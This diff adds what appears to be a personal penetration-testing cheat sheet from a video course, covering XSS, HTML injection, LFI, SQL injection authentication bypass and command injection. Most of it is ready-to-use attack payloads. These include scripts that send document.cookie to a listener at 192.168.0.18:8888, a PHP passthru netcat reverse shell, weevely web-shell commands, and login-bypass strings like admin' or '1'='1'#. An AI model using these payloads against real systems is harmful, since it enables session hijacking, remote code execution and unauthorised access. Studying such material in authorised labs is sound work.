@@ -1,0 +1,93 @@
+======================== Cross Site scripting ========================
+To check Xss - <script>alert(1)</script>
+
+Cookie Stealing
+<script>
+alert(document.cookie);
+var i=new Image;
+i.src="http://192.168.0.18:8888/?"+document.cookie;
+</script>
+
+<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+
+<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
+
+<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
+
+Url Redirection
+
+<script>document.location.href='https://www.google.com'</scirpt>
+
+Malware Download
+
+<a href='malware download link'>Home</a>
+
+Beef Hooking 
+
+note - use hook.js url
+
+WAF Bypass
+
+1.Uppper case + lower Case
+2.Url Encoding
+3.Double Url Encoding
+
+
+
+
+========================================= HTML Injection =============================
+
+redirect to any site - <a href=https://google.com'>Hacked</a>
+
+
+
+
+
+=================================== LFI =====================================
+
+/proc/self/environ
+
+<?php
+passthru('nc -e /bin/bash [kali ip] port');
+?>
+
+weevely generate 112233 /home/kali/404.php
+
+weevely [url of shell] 112233
+
+
+==================================== RFI ==================================
+
+
+Go through the video
+
+
+
+=================================== Authentiction Bypass =================================
+
+
+admin' or '1'='1'#
+' or '='-- -
+
+use github to get more quries
+
+
+==================================== Javascript hacking ====================================
+
+
+learn javascript 
+go through the video 
+
+
+===================================== Command Injection ==================================
+
+nc -e /bin/bash [kali ip] port
+
+===================================== File Upload =====================================
+
+Go through the video
+
+
+
+
+
